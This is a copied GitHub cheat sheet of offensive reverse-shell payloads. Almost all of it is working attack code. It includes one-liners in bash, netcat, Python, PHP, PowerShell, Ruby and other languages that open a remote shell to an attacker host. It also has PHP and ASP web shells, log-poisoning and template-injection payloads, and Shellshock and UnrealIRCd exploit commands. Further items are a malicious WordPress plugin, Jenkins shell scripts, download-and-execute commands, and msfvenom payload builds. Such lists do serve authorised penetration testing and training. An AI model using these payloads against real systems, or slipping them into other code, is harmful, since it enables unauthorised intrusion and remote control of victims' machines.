Original repo : https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet

# `Offensive Reverse Shell (Cheat Sheet)`

- [<kbd>Bash</kbd>](#Bash)
  * [<kbd>Bash URL Encoding</kbd>](#Bash-URL-Encoding)
- [<kbd>Netcat</kbd>](#Netcat)
  * [<kbd>Netcat Linux</kbd>](#Netcat-Linux)
  * [<kbd>Netcat Windows</kbd>](#Netcat-Windows)
  * [<kbd>Netcat URL Encoding</kbd>](#Netcat-URL-Encoding)
  * [<kbd>Netcat Base64 Encoding</kbd>](#Netcat-Base64-Encoding)
- [<kbd>cURL</kbd>](#cURL)
- [<kbd>Wget</kbd>](#Wget)
- [<kbd>WebShell</kbd>](#WebShell)
  * [<kbd>Exif Data</kbd>](#Exif-Data)
  * [<kbd>ASP WebShell</kbd>](#ASP-WebShell)
  * [<kbd>PHP WebShell</kbd>](#PHP-WebShell)
  * [<kbd>Log Poisoning WebShell</kbd>](#Log-Poisoning-WebShell)
      * [<kbd>SSH</kbd>](#Log-Poisoning-SSH)
      * [<kbd>FTP</kbd>](#Log-Poisoning-FTP)
      * [<kbd>HTTP</kbd>](#Log-Poisoning-HTTP)
- [<kbd>Server Side Template Injection (SSTI)</kbd>](#Server-Side-Template-Injection)
- [<kbd>UnrealIRCd</kbd>](#UnrealIRCd)
- [<kbd>Exif Data</kbd>](#Exif-Data-Reverse-Shell)
- [<kbd>Shellshock</kbd>](#Shellshock)
  * [<kbd>SSH</kbd>](#Shellshock-SSH)
  * [<kbd>HTTP</kbd>](#Shellshock-HTTP)
    * [<kbd>HTTP 500 Internal Server Error</kbd>](#Shellshock-HTTP-500-Internal-Server-Error)
- [<kbd>CMS</kbd>](#CMS)
  * [<kbd>WordPress</kbd>](#WordPress)
  * [<kbd>October</kbd>](#October)
  * [<kbd>Jenkins</kbd>](#Jenkins)
    * [<kbd>Windows</kbd>](#Jenkins-Windows)
    * [<kbd>Linux</kbd>](#Jenkins-Linux)
- [<kbd>Perl</kbd>](#Perl)
- [<kbd>Python</kbd>](#Python)
- [<kbd>Python3</kbd>](#Python3)
- [<kbd>PHP</kbd>](#PHP)
- [<kbd>Ruby</kbd>](#Ruby)
- [<kbd>Xterm](#Xterm)
- [<kbd>Ncat</kbd>](#Ncat)
- [<kbd>Socat</kbd>](#Socat)
- [<kbd>PowerShell</kbd>](#PowerShell)
- [<kbd>Awk</kbd>](#Awk)
- [<kbd>Gawk</kbd>](#Gawk)
- [<kbd>Golang</kbd>](#Golang)
- [<kbd>Telnet</kbd>](#Telnet)
- [<kbd>Java</kbd>](#Java)
- [<kbd>Node</kbd>](#Node)
- [<kbd>Msfvenom</kbd>](#Msfvenom)
  * [<kbd>Web Payloads</kbd>](#Web-Payloads)
    * [<kbd>PHP</kbd>](#PHP-Payload)
    * [<kbd>WAR</kbd>](#WAR-Payload)
    * [<kbd>JAR</kbd>](#JAR-Payload)
    * [<kbd>JSP</kbd>](#JSP-Payload)
    * [<kbd>ASPX</kbd>](#ASPX-Payload)
  * [<kbd>Linux Payloads</kbd>](#Linux-Payloads)
    * [<kbd>Listener Netcat</kbd>](#Linux-Listener-Netcat)
    * [<kbd>Listener Metasploit Multi Handler</kbd>](#Linux-Listener-Metasploit-Multi-Handler)
  * [<kbd>Windows Payloads</kbd>](#Windows-Payloads)
    * [<kbd>Listener Netcat</kbd>](#Windows-Listener-Netcat)
    * [<kbd>Listener Metasploit Multi Handler</kbd>](#Windows-Listener-Metasploit-Multi-Handler)

  ---
 
  # <kbd>Bash</kbd>
 
  # <kbd>TCP</kbd>
 
  ```cmd
  bash -i >& /dev/tcp/192.168.1.2/443 0>&1
 
  bash -l > /dev/tcp/192.168.1.2/443 0<&1 2>&1

  sh -i 5<> /dev/tcp/192.168.1.2/443 0<&5 1>&5 2>&5

  bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
  
  0<&196;exec 196<>/dev/tcp/192.168.1.2/443; sh <&196 >&196 2>&196
 
  exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do $line 2>&5 >&5; done
  ```
 
  # <kbd>UDP</kbd>
  
  ```cmd
  sh -i >& /dev/udp/192.168.1.2/443 0>&1
  ```
 
  # <kbd>Bash URL Encoding</kbd>
  
  ```cmd
  bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
  ```
  
  ---
  
  # <kbd>Netcat</kbd>
  
  # <kbd>Netcat Linux</kbd>

  ```cmd
  nc -e /bin/sh 192.168.1.2 443

  nc -e /bin/bash 192.168.1.2 443

  nc -c /bin/sh 192.168.1.2 443
  
  nc -c /bin/bash 192.168.1.2 443
  
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
  ```
  
  ---
  
  # <kbd>Netcat Windows</kbd>
  
  ```cmd
  nc.exe -e cmd 192.168.1.2 443
 
  \\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
  ```
  
  ---
  
  # <kbd>Netcat URL Encoding</kbd>
  
  ```cmd
  nc%20-e%20%2Fbin%2Fsh%20192.168.1.2%20443
  ```
  ```cmd
  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
  ```
 
  # <kbd>Netcat Base64 Encoding</kbd>
 
  ```cmd
  echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjE4IDQ0MyA+L3RtcC9mCg==" | base64 -d | sh
  ```
 
  ---
  
  # <kbd>cURL</kbd>
 
  ```cmd
  root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
  root@kali:~# nc -lvnp 443
  ```
 
  ```cmd
  http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
  ```
  
  ---
   
  # <kbd>Wget</kbd>
 
  ```cmd
  root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
  root@kali:~# nc -lvnp 443
  ```
 
  ```cmd
  http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
  ```
 
  ---
 
  # <kbd>WebShell</kbd>
 
  # <kbd>Exif Data</kbd>
 
  ```cmd
  root@kali:~# exiftool -Comment='<?php system($_GET['cmd']); ?>' filename.png
  root@kali:~# mv filename.png filename.php.png
  ```
 
  # <kbd>ASP WebShell</kbd>
  
  ```asp
  <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
  ```
  
  # <kbd>PHP WebShell</kbd>
  
  # <kbd>Basic</kbd>
   
  ```php
  <?php system($_GET['cmd']); ?>
  ```
   
  ```php
  <?php passthru($_GET['cmd']); ?>
  ```
  
  ```php
  <?php echo exec($_GET['cmd']); ?>
  ```
  
  ```php
  <?php echo shell_exec($_GET['cmd']); ?>
  ```
   
  # <kbd>Basic Proportions OK</kbd>
  ```php
  <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
  ```
  
  ---
  
  # <kbd>Log Poisoning WebShell</kbd>
  
  # <kbd>Log Poisoning SSH</kbd>
  
  > /var/log/auth.log

  ```php
  ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
  ```
  
  > /var/log/auth.log&cmd=id
  
  ---
   
  # <kbd>Log Poisoning FTP</kbd>
  
  > /var/log/vsftpd.log

  ```cmd
  root@kali:~# ftp 192.168.1.3
  Connected to 192.168.1.3.
  220 (vsFTPd 3.0.3)
  Name (192.168.1.2:kali): <?php system($_GET['cmd']); ?>
  331 Please specify the password.
  Password: <?php system($_GET['cmd']); ?>
  530 Login incorrect.
  Login failed.
  ftp> 
   
  ```
  
  > /var/log/vsftpd.log&cmd=id
   
  ---
   
  # <kbd>Log Poisoning HTTP</kbd>

  > /var/log/apache2/access.log
  >
  > /var/log/nginx/access.log

  ```cmd
  curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
  ```
  
  ```cmd
  User-Agent: <?php system($_GET['cmd']); ?>
  ```
  
  > /var/log/apache2/access.log&cmd=id
  > 
  > /var/log/nginx/access.log&cmd=id
  
  ---
   
  # <kbd>Server Side Template Injection</kbd>
  
  ```cmd
  {{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.1.2 443').read()}}
  ``` 
  ```cmd
  {{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
  ``` 
  ```cmd
  {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
  ```
  ```cmd
  {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"')}}
  ```
  ```cmd
  %7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22%27%29%7D%7D
  ```
   
  ---
  
  # <kbd>UnrealIRCd</kbd>
 
  ```cmd
  root@kali:~# echo "AB;nc -e /bin/sh 192.168.1.2 443" |nc 192.168.1.3 6697
  ```
 
  ---
  
  # <kbd>Exif Data Reverse Shell</kbd>
   
  ```cmd
  root@kali:~# exiftool -Comment='<?php system("nc -e /bin/bash 192.168.1.2 443"); ?>' filename.png
  root@kali:~# mv filename.png filename.php.png
  ```
   
  ---
   
  # <kbd>Shellshock</kbd>
  
  # <kbd>Shellshock SSH</kbd>
 
  ```cmd
  root@kali:~# ssh user@192.168.1.3 -i id_rsa '() { :;}; nc 192.168.1.2 443 -e /bin/bash'
  ```
  
  ---
  
  # <kbd>Shellshock HTTP</kbd>
   
  ```cmd 
  curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.2/443 0>&1' http://192.168.1.3/cgi-bin/test.sh
  ```
  ```cmd
  curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
  
  curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
  ```
  
  ---
  
  # <kbd>Shellshock HTTP 500 Internal Server Error</kbd>

  ```cmd
  curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
  
  curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
  
  curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
  
  curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
  ```
  
  ---
  
  # <kbd>CMS</kbd>
   
  # <kbd>WordPress</kbd>
  
  # <kbd>Plugin Reverse Shell</kbd>

  ```cmd
  root@kali:~# nano plugin.php
  ```
   
  ```php
  <?php

  /**
  * Plugin Name: Shelly
  * Plugin URI: http://localhost
  * Description: Love Shelly
  * Version: 1.0
  * Author: d4t4s3c
  * Author URI: https://github.com/d4t4s3c
  */

  exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
  ?>
  ```
  
  ```cmd
  root@kali:~# zip plugin.zip plugin.php
  ```
  
  * Plugins
  
  * Add New
  
  * Upload Plugin
  
  * Install Now
  
  * Activate Plugin
  
  # <kbd>October</kbd>
  
  ```cmd
  function onstart(){
      exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
  }
  ```
  
  ---
   
  # <kbd>Jenkins</kbd>
  
  # <kbd>Jenkins Windows</kbd> 
  
  ```cmd
  println "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443" .execute().text
  ```
   
  ```cmd
  String host="192.168.1.2";
  int port=443;
  String cmd="cmd.exe";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  ```
  
  ```cmd
  command = "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')"
  println(command.execute().text) 
  ```
  
  # <kbd>Jenkins Linux</kbd>
   
  ```cmd
  String host="192.168.1.2";
  int port=443;
  String cmd="bash";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  ```
   
  ---
  
  # <kbd>Perl</kbd>

  ```cmd
  perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```
  
  ---
 
  # <kbd>Python</kbd>

  ```cmd
  export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
  ```

  ```cmd
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  ```

  # <kbd>Python3</kbd>
   
  ```cmd
  #!/usr/bin/python3

  import os
  import socket
  import subprocess

  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("192.168.1.2",443))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  p=subprocess.call(["/bin/sh","-i"])
  ```

  ```cmd
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  ```
   
  ---
   
  # <kbd>PHP</kbd>
  
  ```php 
  <?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f"); ?>
  ```
  
  ```php
  php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'
  
  php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);system("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);passthru("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
  ```
   
  ---
   
  # <kbd>Ruby</kbd>

  ```cmd
  ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

  ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  ```
   
  ---
  
  # <kbd>Xterm</kbd>

  ```cmd
  xterm -display 192.168.1.2:443
  ```
  
  ---
  
  # <kbd>Ncat</kbd>

  # <kbd>TCP</kbd>
   
  ```cmd
  ncat 192.168.1.2 443 -e /bin/bash
  
  ncat 192.168.1.2 443 -e /bin/sh
  ```
  
  # <kbd>UDP</kbd>
   
  ```cmd 
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 192.168.1.2 443 >/tmp/f
  ```
   
  ---
  # <kbd>Socat</kbd>
   
  ```cmd
  socat TCP:192.168.1.2:443 EXEC:sh
  ```
  ```cmd 
  socat TCP:192.168.1.2:443 EXEC:'bash -li',pty,stderr,setsid,sigint,sane 
  ```
   
  --- 
  # <kbd>PowerShell</kbd>

  ```powershell
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  
  powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')
   
  C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/shell.ps1')
   
  powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/powercat.ps1');powercat -c 192.168.1.2 -p 443 -e cmd" 
  ```
  
  ---
 
  # <kbd>Awk</kbd>

  ```cmd
  awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
  ```
  
  ---
  
  # <kbd>Gawk</kbd>
 
  ```cmd
  gawk 'BEGIN {P=443;S="> ";H="192.168.1.2";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
  ```
 
  ---
 
  # <kbd>Golang</kbd>

  ```cmd
  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
  ```
  
  ---
  
  # <kbd>Telnet</kbd>

  ```cmd
  rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p
  ```
  ```cmd
  telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
  ```
  ```cmd
  mknod a p && telnet 192.168.1.2 443 0<a | /bin/sh 1>a
  ``` 
  ```cmd
  TF=$(mktemp -u);mkfifo $TF && telnet 192.168.1.2 443 0<$TF | sh 1>$TF
  ```
   
  ---
  
  # <kbd>Java</kbd>

  ```cmd
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()
  ```
  
  ---
  
  # <kbd>Node</kbd>
  
  ```cmd
  require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');
  ```
   
  ---
  
  # <kbd>Msfvenom</kbd>

  # <kbd>Web Payloads</kbd>

  # <kbd>PHP Payload</kbd>

  ```cmd
  msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
  ```

  ```cmd
  msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
  ```

  # <kbd>War Payload</kbd>

  ```cmd
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
  ```

  # <kbd>JAR Payload</kbd>

  ```cmd
  msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f jar > reverse.jar
  ```

  # <kbd>JSP Payload</kbd>

  ```cmd
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.jsp
  ```

  # <kbd>ASPX Payload</kbd>

  ```cmd
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
  ```

  ---

  # <kbd>Windows Payloads</kbd>

  # <kbd>Windows Listener Netcat</kbd>

  <kbd>x86 - Shell</kbd>

  ```cmd
  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
  ```

  <kbd>x64 - Shell</kbd>

  ```cmd
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
  ```

  # <kbd>Windows Listener Metasploit Multi Handler</kbd>

  <kbd>x86 - Meterpreter</kbd>   

  ```cmd
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
  ```

  <kbd>x64 - Meterpreter</kbd>  

  ```cmd
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
  ```
   
  <kbd>x86 - Shell</kbd>

  ```cmd
  msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
  ```

  <kbd>x64 - Shell</kbd>

  ```cmd
  msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
  ```

  ---

  # <kbd>Linux Payloads</kbd>
 
  # <kbd>Linux Listener Netcat</kbd>

  <kbd>x86 - Shell</kbd>

  ```cmd
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
  ```
 
  <kbd>x64 - Shell</kbd>

  ```cmd
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
  ```
 
  ---

  # <kbd>Linux Listener Metasploit Multi Handler</kbd>
 
  <kbd>x86 - Meterpreter</kbd>

  ```cmd
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
  ```
   
  <kbd>x64 - Meterpreter</kbd>

  ```cmd
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
  ```
 
  <kbd>x86 - Shell</kbd>

  ```cmd
  msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
  ```
 
  <kbd>x64 - Shell</kbd>

  ```cmd
  msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
  ```

 ---
